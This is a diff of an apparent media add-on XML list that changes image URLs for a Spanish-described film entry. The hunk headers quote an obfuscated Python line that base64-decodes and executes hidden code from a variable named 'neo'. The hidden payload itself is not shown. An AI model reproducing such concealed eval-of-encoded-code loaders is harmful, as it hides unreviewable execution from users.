@@ -94,8 +94,8 @@ eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))
 <page></page>
 </regex>
 <info>Una joven de Brooklyn comienza a investigar un caso sin resolver cuando visita a su padre, que vive en una pequeña población cuya comunidad ha cerrado el asunto.</info>
-<thumbnail>https://i.imgur.com/phF9hoo.jpg</thumbnail>
-<fanart>https://i.imgur.com/5tQvCOe.jpg</fanart>
+<thumbnail>https://image.tmdb.org/t/p/original/7ke7FELvB2iiNN5bFZ8TIEUw2TK.jpg</thumbnail>
+<fanart>https://image.tmdb.org/t/p/original/6NFwGsK3yAYjDidHSVi47xDA9HB.jpg</fanart>
 </item>
 
 
@@ -191,8 +191,8 @@ eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))
 <page></page>
 </regex>
 <info>Una joven de Brooklyn comienza a investigar un caso sin resolver cuando visita a su padre, que vive en una pequeña población cuya comunidad ha cerrado el asunto.</info>
-<thumbnail>https://i.imgur.com/phF9hoo.jpg</thumbnail>
-<fanart>https://i.imgur.com/5tQvCOe.jpg</fanart>
+<thumbnail>https://image.tmdb.org/t/p/original/7ke7FELvB2iiNN5bFZ8TIEUw2TK.jpg</thumbnail>
+<fanart>https://image.tmdb.org/t/p/original/6NFwGsK3yAYjDidHSVi47xDA9HB.jpg</fanart>
 </item>
 
 
